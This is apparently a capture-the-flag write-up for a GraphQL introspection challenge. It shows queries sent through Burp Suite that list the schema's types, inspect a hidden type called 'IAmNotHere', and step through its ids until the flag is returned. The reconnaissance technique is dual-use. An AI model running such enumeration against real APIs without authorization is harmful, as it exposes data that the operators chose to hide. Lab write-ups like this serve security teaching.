# Challenge22: GraphQL - Introspection

## Reference:
    - GraphQL doc: https://graphql.org/learn/introspection/
    - StackOverflow on "Get GraphQL whole schema": https://stackoverflow.com/questions/37397886/get-graphql-whole-schema-query

# Solution:

    1. Open Burp Suite and open target site.
    2. This is an example query:

```json
{"query":"{ rockets(country: \"France\") { name, country, is_active } }"}
```
    
    3. Based on GraphQL Introspection Doc, i tried to make this query:
```json
{"query":
	"{ __schema {   types {     name    }}}"
}
```
    4. This query above will return all __Types__ including "Rocket", but there is a type that's kind of sus :():
```
IamNotHere
``` 
    5. Now, we can inspect type "IamNotHere" by make this query:
```json
Request:

{"query":
	"{ __type(name: \"IAmNotHere\") { name   fields { name type { name kind     }   } }}"
}

Response:

{"data":{"__type":{"name":"IAmNotHere","fields":[{"name":"very_long_id","type":{"name":"Int","kind":"SCALAR"}},{"name":"very_long_value","type":{"name":"String","kind":"SCALAR"}}]}}}
```

    6. Now try to query very_long_value with very_long_id:

```json
{"query":"{ IAmNotHere(very_long_id: 1) { very_long_value } }"}
``` 

    7. You can increase very_long_id to get flag:

```json
{"data":{"IAmNotHere":[{"very_long_value":"Congratulations, you can use this flag: ... }}} 
```
